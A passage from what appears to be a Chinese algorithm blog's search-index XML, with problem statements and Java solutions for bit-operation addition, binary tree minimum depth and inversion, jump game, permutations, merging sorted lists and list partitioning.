        <content type="html"><![CDATA[<h2 id="不用-求两数之和"><a href="#不用-求两数之和" class="headerlink" title="不用+/-求两数之和"></a>不用+/-求两数之和</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个整数，在不使用 +/- 这两个运算符的前提下，求它们的和。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSumRecursive</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> b <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> a <span class="token operator">:</span> <span class="token function">getSumRecursive</span><span class="token punctuation">(</span>a<span class="token operator">^</span>b<span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(m), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSumIterative</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> sum <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span>      <span class="token keyword">int</span> carry <span class="token operator">=</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>      a <span class="token operator">=</span> sum<span class="token punctuation">;</span>      b <span class="token operator">=</span> carry<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> a<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树的最小深度</title>
      <link href="/2018/12/16/suan-fa/er-cha-shu/er-cha-shu-de-zui-xiao-shen-du/"/>
      <url>/2018/12/16/suan-fa/er-cha-shu/er-cha-shu-de-zui-xiao-shen-du/</url>
      
        <content type="html"><![CDATA[<h2 id="二叉树的最小深度"><a href="#二叉树的最小深度" class="headerlink" title="二叉树的最小深度"></a>二叉树的最小深度</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，你要找到从根节点到最近的叶子节点的深度。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     4<span class="token code keyword">       / \</span><span class="token code keyword">      8  16</span>这棵树有 3 个叶子节点，分别是 2，8，16。最近的叶子节点是 2，根节点到 2 共有两个节点，因此最小深度是 2。再比如说，给你的二叉树是：  1   \<span class="token code keyword">    2</span><span class="token code keyword">     \</span><span class="token code keyword">      4</span>这棵树唯一的叶子节点是 4，根节点到它共有 3 个节点，因此最小深度是 3</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: (n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">minDepth</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> root<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>left <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">minDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">minDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">minDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">minDepth</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">minDepthIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    Queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> depth <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> size <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeNode s <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">.</span>right <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> depth<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>depth<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跳数组</title>
      <link href="/2018/12/16/suan-fa/shu-zu/tiao-shu-zu/"/>
      <url>/2018/12/16/suan-fa/shu-zu/tiao-shu-zu/</url>
      
        <content type="html"><![CDATA[<h2 id="跳数组"><a href="#跳数组" class="headerlink" title="跳数组"></a>跳数组</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个<strong>非负整数</strong>数组，数组中的每个数字表示那个位置上可以向后跳的<strong>最大</strong>步数。一开始你站在下标为 0 的位置，你要判断是否可以跳到数组最后的位置。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的数组 a 是：2, 4, 0, 1, 2一开始站在下标为 0 的位置，最多能向后跳 2 步。你先跳 1 步，来到 4，再跳 3 步就到达最后的位置。所以要返回 true。再比如说，给你的数组是：2, 1, 0, 4一开始如果跳 2 步，到达 0，不能再跳。一开始如果跳 1 步，到达 1，可以向后再跳 1 步。但跳 1 步后仍然到达 0，不能再跳。因此对于这个数组，你没办法跳到最后的位置，返回 false。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">canJumpToLast</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">>=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> max<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> i<span class="token operator">+</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组的全排列</title>
      <link href="/2018/12/16/suan-fa/shu-zu/shu-zu-de-quan-pai-lie/"/>
      <url>/2018/12/16/suan-fa/shu-zu/shu-zu-de-quan-pai-lie/</url>
      
        <content type="html"><![CDATA[<h2 id="数组的全排列"><a href="#数组的全排列" class="headerlink" title="数组的全排列"></a>数组的全排列</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组，并且数组中没有重复元素，你要返回这个数组所有可能的排列。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的数组是：0, 1, 2你要返回的所有排列是：0, 1, 20, 2, 11, 0, 21, 2, 02, 0, 12, 1, 0</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token function">permuteRec</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">==</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Collections<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">permuteRec</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> start <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>        Collections<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*n!), Space: O(n)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> <span class="token function">permute</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Integer<span class="token operator">>></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token operator">:</span> nums<span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">permuteRec</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合并两个有序链表</title>
      <link href="/2018/12/12/suan-fa/lian-biao/he-bing-liang-ge-you-xu-lian-biao/"/>
      <url>/2018/12/12/suan-fa/lian-biao/he-bing-liang-ge-you-xu-lian-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="合并两个有序链表"><a href="#合并两个有序链表" class="headerlink" title="合并两个有序链表"></a>合并两个有序链表</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个递增排序的链表，你要把它们合成一个链表，并且保持递增排序。另外要求，新链表上的节点使用的就是旧的两个链表上的节点，不能创建新节点。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的两个链表 L1 和 L2，分别是：L1: 1 -> 3L2: 2 -> 4 -> 6合并后的链表就是：1 -> 2 -> 3 -> 4 -> 6</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(m+n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">mergeTwoSortedLists</span><span class="token punctuation">(</span>ListNode l1<span class="token punctuation">,</span> ListNode l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> l2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l1<span class="token punctuation">.</span>val <span class="token operator">&lt;</span> l2<span class="token punctuation">.</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>        p<span class="token punctuation">.</span>next <span class="token operator">=</span> l1<span class="token punctuation">;</span>        l1 <span class="token operator">=</span> l1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        p<span class="token punctuation">.</span>next <span class="token operator">=</span> l2<span class="token punctuation">;</span>        l2 <span class="token operator">=</span> l2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null<span class="token punctuation">)</span> p<span class="token punctuation">.</span>next <span class="token operator">=</span> l1<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> p<span class="token punctuation">.</span>next <span class="token operator">=</span> l2<span class="token punctuation">;</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>翻转二叉树</title>
      <link href="/2018/12/12/suan-fa/er-cha-shu/fan-zhuan-er-cha-shu/"/>
      <url>/2018/12/12/suan-fa/er-cha-shu/fan-zhuan-er-cha-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="翻转二叉树"><a href="#翻转二叉树" class="headerlink" title="翻转二叉树"></a>翻转二叉树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树，你要把它左右镜像翻转，然后返回翻转后的二叉树。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的二叉树是：<span class="token code keyword">     1</span>   /   \  2     4<span class="token code keyword">       / \</span><span class="token code keyword">      8  16</span>左右翻转后的二叉树是：<span class="token code keyword">      1</span><span class="token code keyword">    /   \</span>   4     2  / \ 16  8我们可以看到，二叉树上所有节点都沿中轴线左右互换了位置</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">invertBinaryTreeRecursive</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">;</span>    TreeNode tmp <span class="token operator">=</span> root<span class="token punctuation">.</span>left<span class="token punctuation">;</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> root<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> tmp<span class="token punctuation">;</span>    <span class="token function">invertBinaryTreeRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">invertBinaryTreeRecursive</span><span class="token punctuation">(</span>root<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span>  TreeNode <span class="token function">invertBinaryTreeIterative</span><span class="token punctuation">(</span>TreeNode root<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> root<span class="token punctuation">;</span>    Queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">></span> q <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      TreeNode node <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      TreeNode tmp <span class="token operator">=</span> node<span class="token punctuation">.</span>left<span class="token punctuation">;</span>      node<span class="token punctuation">.</span>left <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">;</span>      node<span class="token punctuation">.</span>right <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>left <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>right <span class="token operator">!=</span> null<span class="token punctuation">)</span> q<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表划分</title>
      <link href="/2018/12/12/suan-fa/lian-biao/lian-biao-hua-fen/"/>
      <url>/2018/12/12/suan-fa/lian-biao/lian-biao-hua-fen/</url>
      
        <content type="html"><![CDATA[<h2 id="链表划分"><a href="#链表划分" class="headerlink" title="链表划分"></a>链表划分</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表和一个数字，你要把小于这个数字的节点都移到链表前面，大于等于这个数字的节点都移到链表后面。并且在较小和较大的这两堆节点中，节点之间的相对顺序保持不变。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的单链表是：0 -> 4 -> 2 -> 1 -> 8 -> 1给你的数字是 2。小于 2 的节点有 0/1/1 共 3 个，大于等于 2 的节点有 4/2/8 共 3 个。因此重新划分后得到的链表是：0 -> 1 -> 1 -> 4 -> 2 -> 8可以看到，较小的那一堆 0/1/1 三个节点保持了在原链表中的相对顺序，较大的那一堆 4/2/8 三个节点也保持了在原链表中的相对顺序。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">partitionAndPreserveOrder</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    ListNode smaller <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> greater <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ListNode ps <span class="token operator">=</span> smaller<span class="token punctuation">,</span> pg <span class="token operator">=</span> greater<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode p <span class="token operator">=</span> head<span class="token punctuation">;</span> p <span class="token operator">!=</span> null<span class="token punctuation">;</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">.</span>val <span class="token operator">&lt;</span> x<span class="token 